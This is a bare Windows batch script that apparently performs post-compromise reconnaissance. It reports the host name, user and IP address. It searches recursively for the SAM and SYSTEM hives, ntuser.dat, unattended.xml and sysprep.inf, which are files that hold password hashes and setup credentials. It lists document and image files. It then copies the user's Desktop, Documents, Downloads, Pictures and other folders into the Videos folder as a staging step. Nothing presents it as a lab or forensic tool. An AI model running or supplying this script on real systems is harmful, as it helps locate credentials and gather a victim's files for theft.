@echo off

echo %computername%\%username%
echo ...................................................................................
for /f "usebackq tokens=2 delims=:" %%i in (`ipconfig ^| findstr /c:"IPv4 Address"`) do echo%%i
echo ...................................................................................
for /f "tokens=1,3" %%i in ('dir "%windir%\System32\config\SAM" /s /a') do if "%%i"=="Directory" echo SAM: %%j
for /f "tokens=1,3" %%i in ('dir "%windir%\System32\config\SYSTEM" /s /a') do if "%%i"=="Directory" echo SYS: %%j
for /f "tokens=1,3" %%i in ('dir "ntuser.dat" /s /a') do if "%%i"=="Directory" echo NTU: %%j
for /f "tokens=1,3" %%i in ('dir "unattended.xml" /s /a') do if "%%i"=="Directory" echo UNATTEND: %%j\
for /f "tokens=1,3" %%i in ('dir "sysprep.inf" /s /a') do if "%%i"=="Directory"  echo SYSPREP: %%j\sysprep

for /f "tokens=1,3" %%i in ('dir "*.docx" /s /a') do if "%%i"=="Directory" echo DOC: %%j
for /f "tokens=1,3" %%i in ('dir "*.xls" /s /a') do if "%%i"=="Directory" echo XLS: %%j
for /f "tokens=1,3" %%i in ('dir "*.pdf" /s /a') do if "%%i"=="Directory" echo PDF: %%j
for /f "tokens=1,3" %%i in ('dir "*.jpg" /s /a') do if "%%i"=="Directory" echo JPG: %%j
echo ...................................................................................
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\3D Objects C:\Users\%username%\Videos`) do set str=%%i
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\Desktop C:\Users\%username%\Videos`) do set str=%%i
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\Documents C:\Users\%username%\Videos`) do set str=%%i
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\Downloads C:\Users\%username%\Videos`) do set str=%%i
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\Music C:\Users\%username%\Videos`) do set str=%%i
for /f "usebackq tokens=2 delims=:" %%i in (`robocopy C:\Users\%username%\Pictures C:\Users\%username%\Videos`) do set str=%%i
echo Transfer Completed.
echo ...................................................................................

pause
